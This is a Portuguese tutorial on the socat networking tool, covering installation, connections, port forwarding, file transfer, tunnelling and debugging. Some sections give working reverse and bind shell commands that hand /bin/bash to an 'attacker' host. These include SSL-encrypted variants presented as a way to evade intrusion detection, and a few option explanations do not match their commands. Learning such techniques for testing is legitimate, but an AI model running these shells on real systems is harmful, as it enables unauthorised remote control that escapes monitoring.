# Socat

## Introdução

Socat, ou *"SOcket CAT"*, é uma poderosa ferramenta de linha de comando para estabelecer comunicação bidirecional entre dois endpoints. Ele é muitas vezes considerado o "canivete suíço" das redes, pois oferece uma grande flexibilidade na manipulação de fluxos de dados, permitindo redirecionamento de portas, tunelamento, criptografia, conexão entre dois processos, e muito mais. Este guia fornecerá uma visão geral sobre como usar o Socat para vários cenários, desde operações básicas até funções avançadas.

## Instalação

### Instalação no Linux

A maioria das distribuições Linux já possui o Socat nos repositórios oficiais.

- **Debian/Ubuntu**:
  ```bash
  sudo apt-get update
  sudo apt-get install socat
  ```

- **CentOS/RHEL**:
  ```bash
  sudo yum install socat
  ```

### Instalação no macOS

Você pode instalar o Socat no macOS usando o Homebrew:

```bash
brew install socat
```

### Verificando a Instalação

Para garantir que o Socat foi instalado corretamente, você pode verificar a versão:

```bash
socat -V
```

## Estrutura Básica de Comando do Socat

A estrutura básica de um comando Socat é:

```bash
socat [<opções>] <endpoint1> <endpoint2>
```

### Exemplos de Endpoints

- **TCP:** `TCP:192.168.1.10:80`
- **UDP:** `UDP:192.168.1.10:1234`
- **Arquivo:** `OPEN:/path/to/file`
- **Shell:** `EXEC:/bin/bash`
- **Padrão de Entrada/Saída:** `-` (stdin/stdout)

### Opções Comuns

- **-d**: Modo de depuração.
- **-v**: Saída verbosa.
- **-d -d**: Modo de depuração detalhada (dobrada).


## Usos Básicos do Socat

###  Conexão TCP Simples

Socat pode ser utilizado para criar uma conexão TCP simples entre dois hosts.

#### Exemplo
Conectar-se a um servidor na porta 80 (como uma alternativa ao `telnet` ou `nc`):

```bash
socat - TCP:example.com:80
```

Isso permite que você envie comandos HTTP manualmente para o servidor.

### Criando um Listener TCP

Socat pode criar um listener que aguarda conexões em uma porta específica. Isso é útil para depurar serviços ou como um servidor simples.

#### Exemplo
Criando um listener na porta 8080:

```bash
socat TCP-LISTEN:8080,fork -
```

Neste exemplo, `fork` permite que múltiplas conexões sejam aceitas simultaneamente.

###  Transferência de Arquivos

Socat pode ser usado para transferir arquivos entre dois hosts. Um host atua como servidor e o outro como cliente.

#### Enviando Arquivo

No host que enviará o arquivo:

```bash
socat TCP-LISTEN:1234,fork FILE:example.txt
```

#### Recebendo Arquivo

No host que receberá o arquivo:

```bash
socat TCP:192.168.1.10:1234 FILE:received.txt
```

### Redirecionamento de Portas

Socat pode redirecionar tráfego de uma porta para outra em uma máquina ou entre hosts. Isso é útil para testes de conectividade, proxies simples ou bypass de firewalls.

#### Exemplo
Redirecionar o tráfego da porta 8080 para a porta 80:

```bash
socat TCP-LISTEN:8080,fork TCP:localhost:80
```

Neste exemplo, qualquer tráfego na porta 8080 será encaminhado para a porta 80 local.

### Executando Comandos Remotamente

Você pode criar uma "shell reversa" ou um listener que permita a execução de comandos remotamente.

#### Shell Reversa

No servidor vulnerável, execute:

```bash
socat TCP:192.168.1.10:1234 EXEC:/bin/bash
```

No atacante, execute:

```bash
sudo socat TCP4-LISTEN:1234,fork -
```

#### Bind Shell

No servidor vulnerável, execute:

```bash
socat TCP-LISTEN:1234,fork EXEC:/bin/bash
```

No atacante, execute:

```bash
sudo socat - TCP4:192.168.1.2:1234
```

### Comunicação via UDP

Além de TCP, o Socat suporta o protocolo UDP, que é útil para comunicação sem estado.

#### Listener UDP
```bash
socat UDP-LISTEN:1234,fork -
```

#### Enviando Pacotes UDP

```bash
echo "Teste de UDP" | socat - UDP:192.168.1.10:1234
```

## Funções Avançadas do Socat

### Criptografia com SSL


Para adicionar criptografia a um bind shell, utilizamos certificados SSL (Secure Socket Layer), que ajudam a proteger a comunicação e dificultam a detecção por sistemas de detecção de intrusão (IDS), escondendo os dados sensíveis transmitidos.

#### Gerando Certificados SSL para o Socat

Usaremos a ferramenta `openssl` para criar um certificado autoassinado. Siga os passos abaixo:

1. **Criar um Certificado Autoassinado e uma Chave Privada**: O comando a seguir gera uma nova chave privada e um certificado autoassinado:

   ```bash
   openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
   ```

   - `req`: Inicia uma nova solicitação de assinatura de certificado.
   - `-newkey rsa:2048`: Cria uma nova chave privada usando RSA com 2048 bits.
   - `-nodes`: Armazena a chave privada sem proteção por senha.
   - `-keyout`: Especifica o arquivo onde a chave privada será salva.
   - `-x509`: Gera um certificado autoassinado.
   - `-days 365`: Define a validade do certificado para 365 dias.
   - `-out`: Especifica o arquivo onde o certificado será salvo.

2. **Combinar o Certificado e a Chave em um Arquivo Único**: Para o Socat usar, combine o certificado e a chave em um arquivo `.pem`:

   ```bash
   cat shell.key shell.crt > shell.pem
   ```

#### Criando um Bind Shell Criptografado com Socat

Com o arquivo `.pem` pronto, configure o Socat para usar a criptografia SSL:

1. **Configurar o Listener do Socat**: Use o comando abaixo para criar um listener criptografado na porta 443 com o Socat:

   ```bash
   sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
   ```

   - `OPENSSL-LISTEN`: Cria um listener SSL na porta especificada.
   - `cert=shell.pem`: Especifica o arquivo de certificado a ser utilizado.
   - `verify=0`: Desativa a verificação do certificado SSL.
   - `fork`: Cria um processo filho quando uma conexão é feita.
   - `EXEC:/bin/bash`: Executa `/bin/bash` quando uma conexão é estabelecida.

2. **Conectando-se ao Bind Shell Criptografado**: Na máquina cliente, use o Socat para se conectar ao bind shell criptografado:

   ```bash
   socat - OPENSSL:10.11.0.4:443,verify=0
   ```

   - `OPENSSL`: Estabelece uma conexão SSL com o listener.
   - `verify=0`: Desativa a verificação do certificado SSL.


### Criando um Reverse Shell Criptografado com Socat

Além do bind shell, também é possível configurar um reverse shell criptografado utilizando SSL com Socat. Um reverse shell inverte a lógica de conexão: a máquina alvo se conecta ao atacante, útil quando portas de entrada estão bloqueadas ou monitoradas.

Os certificados SSL que geramos anteriormente (`shell.pem`) também podem ser usados para o reverse shell.

1. **Configurar o Listener do Reverse Shell no Atacante 

   No sistema do atacante, configure o Socat para escutar conexões reversas usando o certificado `.pem` que criamos:

   ```bash
   sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork -
   ```

   - `OPENSSL-LISTEN`: Cria um listener SSL na porta especificada.
   - `cert=shell.pem`: Especifica o arquivo de certificado a ser utilizado.
   - `verify=0`: Desativa a verificação do certificado SSL.
   - `fork`: Cria um processo filho quando uma conexão é feita.
   - `EXEC:/bin/bash`: Executa `/bin/bash` quando uma conexão é estabelecida.

2. **Iniciar o Reverse Shell na Máquina Alvo

   Na máquina alvo (que se conectará ao atacante), configure o Socat para iniciar um reverse shell para o listener configurado anteriormente:

   ```bash
   socat OPENSSL:10.11.0.2:443,verify=0 EXEC:/bin/bash
   ```

   - `OPENSSL`: Estabelece uma conexão SSL com o listener na máquina do atacante.
   - `IP_DO_ATACANTE`: Substitua pelo endereço IP público ou interno do atacante.
   - `verify=0`: Desativa a verificação do certificado SSL.
   - `EXEC:/bin/bash`: Executa `/bin/bash` ao conectar, fornecendo um shell remoto ao atacante.


### Redirecionamento de Porta Remota (Tunelamento)

Socat pode ser usado para tunelamento, permitindo que você encaminhe tráfego de uma máquina para outra, mesmo através de redes seguras.

#### Exemplo
Tunelando uma conexão para acessar um serviço remoto:

```bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.10:22
```

Isso cria um túnel local para a porta SSH (22) de uma máquina remota.

### Conectando a Serial Ports

Socat pode ser usado para se comunicar com dispositivos de porta serial.

#### Exemplo
Conectando-se a uma porta serial `/dev/ttyS0`:

```bash
socat - /dev/ttyS0,raw,echo=0
```

Este comando abre a porta serial e permite a comunicação com o dispositivo conectado.

### Usando Proxy HTTP

Socat pode ser configurado para funcionar com proxies HTTP.

#### Exemplo
Redirecionando tráfego para um servidor através de um proxy HTTP:

```bash
socat - PROXY:proxy.example.com:example.com:80,proxyport=8080
```

### Limitação de Conexões

Você pode limitar o número de conexões simultâneas que um listener Socat aceita.

#### Exemplo
Limitando o listener para aceitar apenas uma conexão:

```bash
socat TCP-LISTEN:8080,fork,max-children=1 -
```

### Usando IPv6

Socat suporta o protocolo IPv6 para comunicação de rede.

#### Exemplo
Conectando-se a um servidor IPv6:

```bash
socat TCP6:[2001:db8::1]:80 -
```

## Depuração e Monitoramento

Socat oferece várias opções para depurar e monitorar a comunicação:

- **-d**: Modo de depuração (mostra mensagens básicas de depuração).
- **-d -d**: Modo de depuração avançada (mostra informações detalhadas sobre a conexão).
- **-v**: Modo verboso (mostra dados transmitidos e recebidos).
- **-x**: Modo de depuração hexadecimal (mostra dados transmitidos em hexadecimal).

### Exemplo de Depuração
```bash
socat -d -d -v TCP-LISTEN:1234,fork -
```

